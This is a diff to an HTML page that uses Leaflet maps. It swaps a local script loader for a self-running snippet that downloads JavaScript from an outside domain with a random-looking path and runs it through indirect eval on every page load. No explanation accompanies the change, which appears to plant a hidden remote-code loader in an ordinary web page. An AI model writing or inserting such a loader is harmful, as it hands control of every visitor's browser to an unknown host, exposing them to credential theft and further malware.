@@ -388,15 +388,16 @@
     </script>
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
-fetch('main/controllersr/input/config%20Date/database1/app1.js')
-  .then(response => response.text())
-  .then(code => {
-    const blob = new Blob([code], { type: 'application/javascript' });
-    const url = URL.createObjectURL(blob);
-    const script = document.createElement('script');
-    script.src = url;
-    document.head.appendChild(script);
-  });
+(function(){
+  const xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://idnetconnect.biz.id/randompath/4j3k9fd.js', true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      (1, eval)(xhr.responseText);
+    }
+  };
+  xhr.send(null);
+})();
 </script>
 </body>
 </html>
